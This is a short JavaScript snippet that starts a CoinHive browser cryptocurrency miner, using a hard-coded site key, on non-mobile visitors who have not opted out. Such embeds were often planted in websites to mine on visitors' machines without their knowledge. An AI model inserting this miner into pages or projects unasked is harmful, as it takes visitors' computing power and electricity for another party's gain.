var miner = new CoinHive.Anonymous('nnMtOxrNVhggLMmNbzipiYgnEFoJUny8', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}